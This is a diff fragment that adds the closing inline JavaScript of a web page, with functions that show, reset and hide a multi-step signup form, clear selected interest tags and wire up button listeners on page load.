+        function showSignupMode() {
+            pageBody.classList.add('signup-mode');
+            regFormContent.classList.remove('hidden'); 
+            regThankYouMessage.classList.add('hidden'); 
+            currentRegStepIndex = 0;
+            displayRegStep(currentRegStepIndex);
+            regForm.reset(); 
+            if (!isContactEmail) flipContactTypeBtn.click(); 
+            contactInputField.value = ''; 
+
+            selectedInterests = [];
+            document.querySelectorAll('.interest-tag.selected').forEach(tag => tag.classList.remove('selected'));
+            updateInterestsFeedback();
+            clearAllErrorsInStep(0); clearAllErrorsInStep(1); clearAllErrorsInStep(2);
+        }
+
+        function hideSignupMode() {
+            pageBody.classList.remove('signup-mode');
+        }
+
+        function init() {
+            const currentYearEl = document.getElementById('current-year');
+            if(currentYearEl) currentYearEl.textContent = new Date().getFullYear();
+            
+            populateInterests();
+            populateMainSiteNav(); 
+            hideSignupMode(); 
+
+            signupCancelBtn.addEventListener('click', hideSignupMode);
+            if(triggerSignupFromMainBtn) triggerSignupFromMainBtn.addEventListener('click', showSignupMode);
+            backToMainSiteBtn.addEventListener('click', hideSignupMode);
+        }
+
+        document.addEventListener('DOMContentLoaded', init);
+    </script>
+</body>
+</html>
